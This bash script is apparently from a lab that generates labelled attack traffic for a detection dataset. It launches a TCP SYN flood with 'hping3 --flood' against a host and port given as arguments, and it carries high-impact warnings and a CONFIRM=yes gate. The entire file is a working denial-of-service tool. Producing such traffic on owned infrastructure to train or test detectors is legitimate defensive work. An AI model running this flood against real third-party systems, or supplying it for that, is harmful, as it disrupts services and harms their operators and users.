#!/usr/bin/env bash
# lab/attacks/flood-syn.sh — TCP SYN flood.  Label: DoS-SYNFlood
#
# !!! HIGH IMPACT — can disrupt the target and trip provider abuse detection.
# Short bursts only, against infrastructure you own. Needs root (raw sockets).
# RUN FROM THE ATTACKER HOST. Pair with:
#   sudo bash lab/capture.sh --label "DoS-SYNFlood" --duration 30 --attacker-ip <this host>
#
# NOTE: --flood with a real source IP is required so the capture's --attacker-ip
# filter works (do NOT use --rand-source here, or the rows can't be filtered and
# the spoofed sources pollute the data).
set -euo pipefail
TARGET="${1:?usage: flood-syn.sh <host> <port> [seconds]}"
PORT="${2:?port required}"; SECS="${3:-15}"
[ "${CONFIRM:-}" = "yes" ] || { echo "Refusing: set CONFIRM=yes (high-impact flood)"; exit 1; }
command -v hping3 >/dev/null || { echo "need hping3 (run as root)"; exit 1; }
echo "SYN flood $TARGET:$PORT for ${SECS}s ..."
timeout "$SECS" hping3 -S --flood -p "$PORT" "$TARGET" || true
echo "done."
